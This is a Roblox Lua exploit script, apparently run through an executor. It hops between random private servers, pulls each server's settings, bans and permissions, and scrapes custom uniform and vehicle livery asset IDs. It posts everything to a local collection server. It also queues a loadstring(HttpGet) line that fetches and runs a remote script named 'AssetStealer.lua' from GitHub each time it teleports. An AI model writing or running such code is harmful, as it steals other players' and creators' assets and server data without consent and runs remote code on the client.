local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")

-- Wait safely for a folder with timeout
local function waitForFolder(parent, name, timeout)
    local t = 0
    while t < (timeout or 5) do
        local folder = parent:FindFirstChild(name)
        if folder then return folder end
        task.wait(0.5)
        t = t + 0.5
    end
    return nil
end

-- Check if this is a private server
local function isPrivateServer()
    local PrivateServers = ReplicatedStorage:FindFirstChild("PrivateServers")
    if not PrivateServers then return false end

    local Info = PrivateServers:FindFirstChild("Info")
    if not Info then return false end

    local ownerName = Info:FindFirstChild("OwnerName")
    return ownerName and ownerName.Value ~= ""
end

-- Safe POST to local server
local function safePost(endpoint, body)
    local ok, err = pcall(function()
        request({
            Url = "http://127.0.0.1:5000/" .. endpoint,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(body)
        })
    end)
    if not ok then
        warn("Failed POST to " .. endpoint, err)
    end
end

-- Join a random private server
local function joinRandomServer()
    local PrivateServers = ReplicatedStorage:FindFirstChild("PrivateServers")
    if not PrivateServers then
        warn("PrivateServers not found")
        return false
    end

    local GetServers = PrivateServers:FindFirstChild("GetServers")
    local JoinServer = PrivateServers:FindFirstChild("JoinServer")
    if not GetServers or not JoinServer then
        warn("Missing server remotes")
        return false
    end

    local success, serversResult = pcall(function()
        return GetServers:InvokeServer()
    end)
    if not success or type(serversResult) ~= "table" then
        warn("Failed to get servers")
        return false
    end

    local serverKeys = {}
    for key, _ in pairs(serversResult) do
        table.insert(serverKeys, key)
    end
    if #serverKeys == 0 then
        warn("No servers available")
        return false
    end

    -- Retry until successful queue
    while true do
        local randomKey = serverKeys[math.random(1, #serverKeys)]
        print("Attempting to join server:", randomKey)

        local joinSuccess, joinResult = pcall(function()
            return JoinServer:InvokeServer(randomKey, false, false)
        end)

        if joinSuccess and joinResult == "Queue" then
            print("Queued successfully:", randomKey)
            return true
        else
            warn("Join failed:", joinResult)
            task.wait(1)
        end
    end
end

-- Collect uniforms and liveries, then POST
local function collectData()
    local PrivateServers = ReplicatedStorage:FindFirstChild("PrivateServers")
    if not PrivateServers then warn("PrivateServers missing") return end
    local GetSettings = PrivateServers:FindFirstChild("GetSettings")
    if not GetSettings then warn("GetSettings remote missing") return end

    local success, result = pcall(function()
        return GetSettings:InvokeServer()
    end)
    if not success or not result then
        warn("Failed to get server settings")
        return
    end

    local uniqueKey = result.Data.UniqueKey

    -- Wait for uniforms folder
    local ReplicatedState = waitForFolder(ReplicatedStorage, "ReplicatedState", 5)
    if not ReplicatedState then warn("ReplicatedState not found") return end
    local UniformsFolder = waitForFolder(ReplicatedState, "Uniforms", 5)
    if not UniformsFolder then warn("Uniforms folder missing") return end

    -- Collect uniforms
    local uniforms = {}
    for _, category in ipairs(UniformsFolder:GetChildren()) do
        if category:IsA("Folder") then
            uniforms[category.Name] = {}
            for _, subFolder in ipairs(category:GetChildren()) do
                if subFolder:IsA("Folder") then
                    local items = {}
                    for _, item in ipairs(subFolder:GetChildren()) do
                        if item:IsA("Shirt") then
                            items.Shirt = item.ShirtTemplate
                        elseif item:IsA("Pants") then
                            items.Pants = item.PantsTemplate
                        end
                    end
                    if next(items) then
                        uniforms[category.Name][subFolder.Name] = items
                    end
                end
            end
        end
    end

    safePost("uniforms", {UniqueKey = uniqueKey, data = uniforms, ServerSettings = result.Data})
    safePost("info", {UniqueKey = uniqueKey, Data = result.Data})
    safePost("bans", {UniqueKey = uniqueKey, Data = result.Data})
    safePost("permissions", {UniqueKey = uniqueKey, Data = result.Data})

    -- Wait for vehicles folder
    local vehiclesFolder = waitForFolder(Workspace, "Vehicles", 5)
    if not vehiclesFolder then warn("Vehicles folder missing") return end

    -- Collect liveries
    local liveries = {}
    for _, vehicle in ipairs(vehiclesFolder:GetChildren()) do
        if vehicle:IsA("Model") then
            local body = vehicle:FindFirstChild("Body")
            if body then
                local vehicleName = vehicle.Name
                local seenSignatures = {}

                for _, colorFolder in ipairs(body:GetChildren()) do
                    if colorFolder.Name == "COLOR" then
                        local decals = {}
                        for _, decal in ipairs(colorFolder:GetChildren()) do
                            if decal:IsA("Decal") and decal.Name:sub(1,12) == "CustomLivery" and decal.Texture ~= "" then
                                decals[decal.Name] = decal.Texture
                            end
                        end

                        if next(decals) then
                            local sigParts = {}
                            for k,v in pairs(decals) do
                                table.insert(sigParts, k .. "=" .. v)
                            end
                            table.sort(sigParts)
                            local signature = table.concat(sigParts, "|")

                            if not seenSignatures[signature] then
                                seenSignatures[signature] = true
                                liveries[vehicleName] = liveries[vehicleName] or {}
                                local liveryKey = "Livery_" .. HttpService:GenerateGUID(false)
                                liveries[vehicleName][liveryKey] = decals
                            end
                        end
                    end
                end
            end
        end
    end

    safePost("liveries", {UniqueKey = uniqueKey, Data = liveries})
end

-- Main
local function main()
    if not isPrivateServer() then
        print("Not in a private server, queuing teleport & joining...")
        -- Queue the script first
        queue_on_teleport([[
            loadstring(game:HttpGet("https://raw.githubusercontent.com/1Sebass2/scripts/refs/heads/main/AssetStealer.lua"))()
        ]])
        -- Then join a private server
        joinRandomServer()
        return
    end

    -- Already in private server: wait a moment for replication, then collect
    task.wait(2)
    collectData()
end

main()
